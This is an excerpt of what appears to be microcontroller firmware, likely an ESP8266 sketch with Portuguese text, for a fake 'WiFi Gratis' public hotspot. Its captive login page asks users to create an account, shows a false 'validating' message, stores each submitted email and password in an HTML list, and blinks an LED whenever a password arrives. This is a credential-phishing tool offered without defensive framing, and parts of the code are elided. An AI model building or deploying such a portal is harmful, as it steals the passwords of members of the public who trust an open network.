...
#define SSID_NAME "WiFi Gratis"
#define SUBTITLE "Ponto de acesso publico."
#define TITLE "Login:"
#define BODY "Crie uma conta para logar na rede publica."
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta está sendo validada. Por favor, espere 5 minutos para conectar.</br>Obrigado."
...
String posted() {
  ...
  Credentials="<li>Email: <b>" + email + "</b></br>Senha: <b>" + password + "</b></li>" + Credentials;
...
void BLINK() { // Faz o led interno piscar cinco vezes quando enviarem uma senha.
  int count = 0;
  while(count < 5){
